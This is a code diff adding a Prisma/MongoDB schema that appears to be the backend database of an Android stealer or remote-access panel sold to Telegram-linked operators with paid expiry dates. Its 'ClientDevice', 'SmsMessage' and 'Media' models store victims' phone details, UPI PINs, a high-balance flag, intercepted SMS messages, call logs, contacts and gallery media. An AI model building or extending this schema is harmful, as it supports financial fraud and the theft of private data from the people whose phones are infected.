@@ -1,0 +1,149 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "mongodb"
+  url      = env("MONGODB_URI")
+}
+
+model User {
+  id           String        @id @default(auto()) @map("_id") @db.ObjectId
+  name         String 
+  tg_username  String
+  tg_id        Int           @unique
+  password     String    
+  username     String        @unique
+  last_login   DateTime?
+  exp_date     DateTime
+  amount_paid  String
+  isDisabled  Boolean       @default(false)
+  isTwoFactor  Boolean       @default(true)
+  isMultiDevice Boolean      @default(false)
+  lang         String        @default("en")
+  registeredOn DateTime      @default(now())
+  user_devices UserDevice[]
+  client_devices ClientDevice[]
+  user_sessions userSession[]
+  media        Media[]
+
+  @@map("users")
+  SmsMessage SmsMessage[]
+}
+
+model adminOtp {
+  id        String   @id @default(auto()) @map("_id") @db.ObjectId
+  username  String
+  tgId      Int
+  otp       String
+  expiresAt DateTime
+  createdAt DateTime @default(now())
+  @@unique([username, tgId])
+  @@map("admin_otps")
+}
+
+model userSession {
+  id          String   @id @default(auto()) @map("_id") @db.ObjectId
+  userId      String   @db.ObjectId
+  user        User     @relation(fields: [userId], references: [id])
+  sessionId   String   @unique
+  createdAt   DateTime @default(now())
+  expiresAt   DateTime
+  isActive    Boolean  @default(true)
+
+  @@map("user_sessions")
+}
+
+model UserDevice {
+  id          String   @id @default(auto()) @map("_id") @db.ObjectId
+  status      Boolean  @default(true)
+  loggedInAt  DateTime @default(now())
+  lastSeen    DateTime @updatedAt
+  ipAddress   String
+  userAgent   String
+  user        User     @relation(fields: [userId], references: [id])
+  userId      String   @db.ObjectId
+
+  @@map("user_devices")
+}
+
+
+model ClientDevice {
+  id          String     @id @default(auto()) @map("_id") @db.ObjectId
+  userId      String     @db.ObjectId
+  user        User       @relation(fields: [userId], references: [id])
+  deviceId    String     @unique
+  socketId    String?
+  modelName   String
+  androidV    String
+  isRoot      Boolean
+  isSdCard    Boolean
+  storage     String
+  sdkV        String
+  cpu_arch    String
+  battery     String
+  ipAddress   String
+  service_provider String
+  mobNo       String
+  simData     Json[]
+  note        String?
+  upi_pin     String?
+  FCM_Token     String?
+  imgUrl      String?
+  isHighBalance Int? @default(0)
+  callLogsUri String?
+  contactsUri String?
+  isReadCallLogs Boolean? @default(false)
+  isReadContacts Boolean? @default(false)
+  status      Boolean    @default(true)
+  joined      DateTime   @default(now())
+  lastSeen    DateTime   @updatedAt
+  messages    SmsMessage[]  @relation("DeviceMessages")
+  media       Media[]
+
+  @@map("client_devices")
+}
+
+model SmsMessage {
+  id        String     @id @default(auto()) @map("_id") @db.ObjectId
+  timestamp DateTime
+  sender    String
+  textMessage String
+  type      String     @default("incoming")
+  device    ClientDevice @relation(fields: [deviceId], references: [id], name: "DeviceMessages")
+  deviceId  String     @db.ObjectId
+  userId    String     @db.ObjectId
+  user      User       @relation(fields: [userId], references: [id])
+
+  @@map("sms_messages")
+}
+
+model TempDevice {
+  id          String     @id @default(auto()) @map("_id") @db.ObjectId
+  socketId    String     @unique
+  userId      String?
+  ipAddress   String
+  connectedAt DateTime   @default(now())
+
+  @@map("temp_devices")
+}
+
+model Media {
+  id         String   @id @default(auto()) @map("_id") @db.ObjectId
+  userId     String   @db.ObjectId
+  user       User     @relation(fields: [userId], references: [id])
+  deviceId   String
+  device     ClientDevice @relation(fields: [deviceId], references: [deviceId])
+  url        String
+  type       String
+  size       Int
+  filename   String
+  caption    String?
+  source     String   @default("gallery")
+  capturedAt DateTime?
+  uploadedAt DateTime @default(now())
+
+  @@index([userId])
+  @@index([deviceId])
+  @@map("media")
+}
